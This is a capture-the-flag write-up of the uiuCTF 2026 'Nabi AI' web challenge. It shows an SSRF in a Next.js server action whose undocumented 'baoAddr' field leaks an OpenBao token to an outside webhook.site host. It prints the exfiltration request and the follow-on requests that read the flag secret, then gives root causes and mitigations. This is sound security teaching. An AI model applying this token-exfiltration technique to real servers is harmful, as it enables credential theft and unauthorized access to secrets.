---
title: uiuCTF 2026
---

cooperated with AAA.


# Nabi AI 

> **Category:** Web
> **Description:** *Hey! Listen! to the most advanced AI on the market!* You do not need to bruteforce anything to solve this challenge, please do not attempt to.
> **Hint:** Ugh more sourceless? web.

## Challenge Overview

Three services are deployed per instance:

| Service | URL | Purpose |
|---|---|---|
| Challenge (Nabi AI) | `/nabi-ai.chal.uiuc.tf` | Next.js chat application ("most advanced AI") |
| OpenBao | `/openbao-nabi-ai.chal.uiuc.tf` | A Vault-compatible secrets server |
| Flag Service | `/flag-service-nabi-ai.chal.uiuc.tf` | Returns the flag given a valid API key |

An attachment `config.hcl` describes the OpenBao setup. The flag service returns
`401 {"error":"Invalid API key. Please provide a valid API key with the x-api-token header."}`
without the right key, so the goal is to obtain the correct `x-api-token`.

## Reconnaissance

### 1. Understanding `config.hcl`

The OpenBao configuration shows:

```hcl
storage "inmem" {}

seal "static" {
  current_key = "env://OPENBAO_UNSEAL_KEY"
}

initialize "nabi" {
  request "enable-secrets" { path = "sys/mounts/secret" }     # kv v2 mount at secret/
  request "create-policy" {
    path = "sys/policies/acl/nabi-app"
    data = { policy = <<-EOT
        path "secret/data/+" {
          capabilities = ["read"]
        }
      EOT
    }
  }
  request "store-api-key" {
    path = "secret/data/nabi"
    data = { data = { NABI_API_KEY = { eval_source = "env", env_var = "NABI_API_KEY" } } }
  }
  request "store-flag-api-key" {
    path = "secret/data/flag"
    data = { data = { FLAG_API_KEY = { eval_source = "env", env_var = "FLAG_API_KEY" } } }
  }
  request "create-app-token" {
    path = "auth/token/create"
    data = {
      id             = { eval_source = "env", env_var = "OPENBAO_APP_TOKEN" }
      policies       = ["nabi-app"]
      no_parent      = true
      no_default_policy = true
    }
  }
}
```

Key takeaways:

- A KV v2 secrets engine lives at `secret/`, containing two secrets:
  - `secret/data/nabi` → `NABI_API_KEY` (used by the Nabi AI app)
  - `secret/data/flag` → `FLAG_API_KEY` (used by the flag service)
- A single app token (`OPENBAO_APP_TOKEN`) is minted with the `nabi-app` ACL policy.
- Critically, the `nabi-app` policy grants **read on `secret/data/+`** — i.e. it can read *both*
  `secret/data/nabi` **and** `secret/data/flag`. The flag secret is not protected from this token.

So the entire game is: **get the app token**. With it, read `secret/data/flag`, extract
`FLAG_API_KEY`, and send it as `x-api-token` to the flag service.

### 2. Exploring the Nabi AI app

The web app is a Next.js (Turbopack) chat UI. Interesting facts found during exploration:

- There are **no** `fetch()`/`/api/*` calls in the frontend. All interaction happens through a
  **Next.js Server Action**: `POST /` with header `next-action: 407e153d...` and body
  `[{"conversationId":"...","content":"..."}]`.
- Downloadable source maps (`/_next/static/chunks/*.js.map`) revealed the client source, including
  the request types in `app/_types/chat.ts`:

```ts
type SendMessageRequest = {
  conversationId?: string;
  content: string;
  /** @deprecated ... Used in development to set the openbao url */
  baoAddr?: string;   // <-- undocumented extra field accepted by the server action
};
```

- The server action accepts an undocumented `baoAddr` field. The comment says it is used in
  development to point at a different OpenBao instance.
- Sending a message with `baoAddr` set to an arbitrary/unreachable URL caused a **HTTP 500**,
  while omitting it returned a normal 200. This confirmed the server performs an outbound request
  to `baoAddr` while handling the chat message — an **SSRF / argument-injection** primitive.

## Exploitation

### Step 1 — Leak the app token via `baoAddr`

The server talks to OpenBao using its own app token. Vault/OpenBao clients authenticate with the
`X-Vault-Token` header. If we control `baoAddr`, the server will send its OpenBao request — and its
token — to us.

We sent:

```
POST /  (next-action: 407e153d5824829d199a24b87d41748243b5d2fdf3)
Content-Type: text/plain;charset=UTF-8

[{"conversationId":"$undefined","content":"Hello","baoAddr":"https://webhook.site/bebf4f67-..."}]
```

The server responded 500 (it failed to get a valid OpenBao response), but it had already made the
outbound request. A webhook.site inbox received:

```
URL:     https://webhook.site/<our-id>/v1/secret/data/nabi
Header:  x-vault-token: nabi-local-app-token-9c3e680272d5ca0ac9112f7b71d1bf
```

We now hold the application token. (We never needed to return a valid fake Vault response — the
token is sent in the request headers regardless.)

### Step 2 — Read the flag secret from the real OpenBao

Using the leaked token against the real OpenBao instance (the `nabi-app` policy allows reading
`secret/data/+`):

```
GET /v1/secret/data/flag
x-vault-token: nabi-local-app-token-9c3e680272d5ca0ac9112f7b71d1bf
```

Response:

```json
{ "data": { "data": { "FLAG_API_KEY": "sk-flag-44569147aa693f5154e7" }, ... } }
```

### Step 3 — Get the flag from the flag service

```
GET /
x-api-token: sk-flag-44569147aa693f5154e7
```

```json
{ "flag": "uiuctf{lets_just_go_back_to_a_monolith_983c1ec97484}" }
```

## Root Cause

1. **Over-broad OpenBao policy.** The `nabi-app` token could read *all* secrets under `secret/data/+`,
   including `secret/data/flag` which should only ever be consumed by the flag service.
2. **`baoAddr` argument injection / SSRF.** The server action blindly honored a caller-supplied
   `baoAddr` value and forwarded the application token to it, turning the OpenBao client into a
   token-exfiltration oracle.
3. **Server-side secret handling.** All secrets were held server-side behind a token that could be
   coerced into revealing itself via an outbound request.

## Mitigations

- Restrict the app token policy to only the secret it needs (`secret/data/nabi`), not `secret/data/+`.
- Remove/deprecate the `baoAddr` override, or at minimum validate it against an allow-list and never
  forward credentials to user-controlled hosts.
- Move the OpenBao address into server configuration only, never into the request body.
